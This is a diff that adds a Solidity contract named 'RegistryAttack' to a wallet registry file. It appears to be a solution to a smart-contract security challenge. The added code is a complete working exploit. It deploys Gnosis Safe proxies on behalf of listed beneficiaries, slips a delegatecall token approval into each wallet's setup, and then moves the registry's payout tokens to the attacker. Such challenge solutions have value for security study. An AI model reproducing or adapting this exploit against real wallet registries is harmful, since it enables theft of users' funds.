@@ -95,3 +95,53 @@ contract WalletRegistry is IProxyCreationCallback, Ownable {
         token.transfer(walletAddress, TOKEN_PAYMENT);        
     }
 }
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol"; 
+import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
+
+contract RegistryAttack {
+
+    address public immutable masterCopy;
+    address public immutable walletFactory;
+    IERC20 public immutable token;
+    address public immutable registry;
+    uint public constant amount = 10*10**18;
+    constructor(
+        address masterCopyAddress,
+        address walletFactoryAddress, 
+        address tokenAddress,
+        address _registry
+    ) {
+        masterCopy = masterCopyAddress;
+        walletFactory = walletFactoryAddress;
+        token = IERC20(tokenAddress);
+        registry = _registry;
+    }
+    function delegateApprove(address _spender, address _token) external {
+        IERC20(_token).approve(_spender, amount);
+    }
+
+    function attack (address[] memory beneficiaries) external {
+        for(uint i = 0; i < 4; i++){
+            address[] memory beneficiary = new address[](1);
+            beneficiary[0] = beneficiaries[i];
+            bytes memory _initializer = abi.encodeWithSelector(
+                GnosisSafe.setup.selector, 
+                beneficiary,
+                1,
+                address(this),
+                abi.encodeWithSelector(RegistryAttack.delegateApprove.selector, address(this), address(token)),
+                address(0),
+                0,
+                0,
+                0
+            );
+            (GnosisSafeProxy _proxy) = GnosisSafeProxyFactory(walletFactory).createProxyWithCallback(
+                masterCopy,
+                _initializer,
+                i,
+                IProxyCreationCallback(registry)
+            );
+            token.transferFrom(address(_proxy), msg.sender, amount);
+        }
+    }
+}
